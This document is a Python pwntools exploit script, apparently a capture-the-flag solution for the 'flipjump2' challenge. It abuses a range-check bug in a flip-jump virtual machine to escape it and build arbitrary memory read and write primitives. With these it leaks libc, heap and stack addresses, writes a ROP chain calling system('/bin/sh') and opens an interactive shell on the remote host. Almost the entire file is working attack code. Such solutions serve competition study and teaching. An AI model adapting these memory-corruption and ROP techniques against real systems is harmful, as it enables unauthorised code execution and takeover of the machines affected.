from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './flipjump_fixed'
HOST = 'flipjump2.chal.perfect.blue'
PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		#return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

# bug is at range check of next_ip. 
# you can set negative offset to get 4bit random value from player1.
# layout of flipjump code is this like:
# 0     - 0x100: jump table * 0x10 set
# 0x100 - 0xa00: move answer value & clean return value
# 0xa00 - 0xa7f: loader to fix #0 jump table and jump to target
# 0xa80 - 0xeef: set return value
# 0xef0 - 0xeff: player2 return value

r = start()

size = 0x1000
loader = 0xa00
final = 0xa80
target = 0xef0
p1ret = 0x7fffffffffffffec
waste = target+0x18 # garbage flips

def fj(flip_byte, flip_bit, next_idx):
    return flat( flip_byte << 3 | flip_bit, next_idx )

def set_p1ret(value, bit):
    payload = b''
    payload += fj(waste, 1, loader >> 4) # will be rewrite to fj(waste, 1, 0x10) by loader

    # jump tables except #0
    #payload += fj( waste, 0, 0x010)
    payload += fj( waste, 0, 0x012)
    payload += fj( waste, 0, 0x016)
    payload += fj( waste, 0, 0x018)
    payload += fj( waste, 0, 0x01e)
    payload += fj( waste, 0, 0x020)
    payload += fj( waste, 0, 0x024)
    payload += fj( waste, 0, 0x026)

    payload += fj( waste, 0, 0x02e)
    payload += fj( waste, 0, 0x030)
    payload += fj( waste, 0, 0x034)
    payload += fj( waste, 0, 0x036)
    payload += fj( waste, 0, 0x03c)
    payload += fj( waste, 0, 0x03e)
    payload += fj( waste, 0, 0x042)
    payload += fj( waste, 0, 0x044)

    # re-construct answer
    for _ in range(2):
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#0
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#2
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 1, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#6
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#8
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 2, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 2, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#e
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#x10
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 1, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#x14
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
 
        payload += fj( target-8, 0, ( len(payload) // 0x10) + 1 )#x16
        payload += fj( target+8, 0, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 1, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 2, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 2, ( len(payload) // 0x10) + 1 )
        payload += fj( target-8, 3, ( len(payload) // 0x10) + 1 )
        payload += fj( target+8, 3, ( len(payload) // 0x10) + 1 )

    payload += fj( waste, 0, final >> 4 )
    assert(len(payload) <= (loader))

    # loader: fix table #0 and jump to answer value 
    payload = payload.ljust(loader, b'b')
    payload += fj(8, 5, (loader>>4) + 0x1) #a0 --> 80
    payload += fj(8, 7, (loader>>4) + 0x2) #80 --> 00
    payload += fj(8, 4, target>>4) # 00 --> 10
    assert(len(payload) <= (final))
    
    # final: set p1ret to value << 3 | bit
    payload = payload.ljust(final, b'c')
    ctr = 0
    v = (value << 3) | bit
    for i in range(8*6+3):
        if (v >> i) & 1 != 0:
            ctr += 1
            payload += fj(target+8+(i // 8), i % 8, (final>>4) + ctr)
    #payload += fj(size-1, 0, final>>4 + 0x2)
    payload += fj(size, 0, 0) # this will escape from vm
    assert(len(payload) <= (target))
    
    payload = payload.ljust(target-0x10, b'd')
    
    # keep p1ret clean
    payload += fj(waste, 0, 0) # copy answer here
    payload += flat(0, 0) # original answer is here
    payload = payload.ljust(size, b'e')
    
    r.sendafter(b'length:\n', p64(size))
    r.sendafter(b'code:\n', payload)

def get_answer(offset=-0x10):
    payload = b''
    payload += fj(waste, 1, loader >> 4) # will be rewrite to fj(waste, 1, 0x10) by loader

    # jump tables except #0
    for i in range(1, 0x10):
        payload += fj( waste, 1, 0x10 + i * 0x9)

    # re-construct each value [ex. jump from #3 table --> return 3]
    # p2ret addr is target + 8
    for i in range(0x10):
        for j in range(8):
            if (i >> j) & 1 == 1:
                payload += fj( target+8, j, 0x10 + i * 0x9 + (j+1)*0x1)
            else:
                payload += fj( waste, 0, 0x10 + i * 0x9 + (j+1)*0x1)
        payload += fj( waste, 0, final>>4)
    assert(len(payload) <= (loader))

    # loader: fix table #0 and jump to the value p1ret 
    payload = payload.ljust(loader, b'b')
    payload += fj(8, 5, (loader>>4) + 0x1)
    payload += fj(8, 7, (loader>>4) + 0x2)
    payload += fj(8, 4, p1ret+(offset>>4))
    assert(len(payload) <= (final))
    
    # final: do something if you need after reconstruct p1ret
    payload = payload.ljust(final, b'c')
    #payload += fj(size-1, 0, final>>4 + 0x2)
    payload += fj(size, 0, 0) # this will escape from vm
    
    payload = payload.ljust(target, b'd')
    
    # keep p2ret clean
    payload += fj(target, 0, 0)
    payload = payload.ljust(size, b'e')
    
    r.sendafter(b'length:\n', p64(size))
    r.sendafter(b'code:\n', payload)

def flip(addr, bit, offset=0, cont=True):
    set_p1ret(addr, bit)
    get_answer(offset)

    r.recvuntil(b'Flip[')
    bit_address = int(r.recvuntil(b']', True))
    r.recvuntil(b'Bit ')
    bit_position = int(r.recv(1))
    original_value = int(r.recv(2))

    if cont==True:
        r.sendafter(b'Play again? (Y/N)\n', b'Y')
    else:
        r.sendafter(b'Play again? (Y/N)\n', b'N')
    return original_value

def aar(off):
    leak = 0
    for i in range(6):
        for j in range(8):
            leak |= flip(off+i, j, 0x10) << ((i*8)+j)
    return leak

def aaw(off, value):
    for i in range(6):
        for j in range(8):
            check = flip(off+i, j, 0x10)
            if (value >> ((i * 8)+j)) & 1 == check:
                flip(off+i, j, 0x10)

def libc_leak():
    return aar(0x40)

def heap_leak():
    return aar(0x50)

# halfsize chunk for leak
size = 0x800
r.sendafter(b'length:\n', p64(size))
r.sendafter(b'code:\n', flat(size<<3, 0)+b'\x00'*(size-0x10))
size = 0x1000
get_answer(offset=0)
r.sendafter(b'Play again? (Y/N)\n', b'Y')

if args.D:
    #debug(r, [0x1464, 0x13b8, 0x145d, 0x18b4, 0x16f7, 0x138f])
    #debug(r, [0x1837, 0x16b7, 0x1464] )
    debug(r, [0x1a32])
    #debug(r, [])

leak = libc_leak()
base = leak - 0x21a1d0
environ = base + 0x221200
system = base + 0x50d60
rdi = base + 0x001bc021
binsh = base + 0x1d8698
dbg('base')
leak = heap_leak()
heap = leak - 0x2f0
dbg('heap')

vm_base = heap + 0x2c0
stack = aar(environ-vm_base)
dbg('stack')
aaw(environ-vm_base, stack) # fix environ for system
rop_addr = stack - 0x120
dbg('rop_addr')

aaw(rop_addr-vm_base, rdi+1)
aaw(rop_addr-vm_base+8, rdi)
aaw(rop_addr-vm_base+0x10, binsh)
aaw(rop_addr-vm_base+0x18, system)
flip(0, 0, 0x10, cont=False)

r.interactive()
r.close()
